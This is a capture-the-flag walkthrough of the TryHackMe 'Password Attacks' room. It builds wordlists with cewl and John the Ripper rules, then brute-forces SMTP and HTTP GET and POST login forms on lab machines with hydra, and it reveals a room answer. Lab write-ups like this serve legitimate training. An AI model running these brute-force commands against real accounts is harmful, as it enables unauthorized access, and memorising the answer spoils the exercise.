# Password Attacks

**Room Link:** [https://tryhackme.com/room/passwordattacks](https://tryhackme.com/room/passwordattacks)



## Deploy the VM

Creating a wordlist from this site as recommend in the room.

**Kali**

```
cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/  
```

## Offline Attacks

**In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.131.68:25 (SMTP).**

**What is the password? Note that the password format is as follows: \[symbol]\[dictionary word]\[0-9]\[0-9].**

#### **john.conf**

```
[List.Rules:THM-Password-Attacks]
Az"[0-9][0-9]" ^[!@#$]
```

**Kali**

```
john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
hydra -l pittman@clinic.thmredteam.com -P dict.lst smtp://$VICTIM:25 -v
```

Answer is !multidisciplinary00

**Perform a brute-forcing attack against the phillips account for the login page at http://10.10.130.199/login-get using hydra? What is the flag?**

<figure><img src="../../.gitbook/assets/image (2) (9) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (21) (5).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
hydra -l phillips -P ../dict.lst 10.10.130.199 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```



<figure><img src="../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>



\
**Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.10.130.199/login-post/. What is the flag?**

**Note: use the clinic.lst dictionary in generating and expanding the wordlist!**



**Kali**

```
john --wordlist=clinic.lst --rules=Single-Extra --stdout > dict2.lst

./hydra -l burgess -P dict2.lst 10.10.130.199 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
```

<figure><img src="../../.gitbook/assets/image (14) (8).png" alt=""><figcaption></figcaption></figure>
